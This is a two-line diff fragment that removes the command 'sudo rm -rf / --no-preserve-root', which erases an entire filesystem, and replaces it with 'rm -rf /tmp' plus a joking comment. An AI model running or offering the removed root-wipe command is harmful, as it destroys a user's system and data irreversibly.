@@ -1,1 +1,2 @@
-sudo rm -rf / --no-preserve-root
+rm -rf /tmp
+# you can thank me later
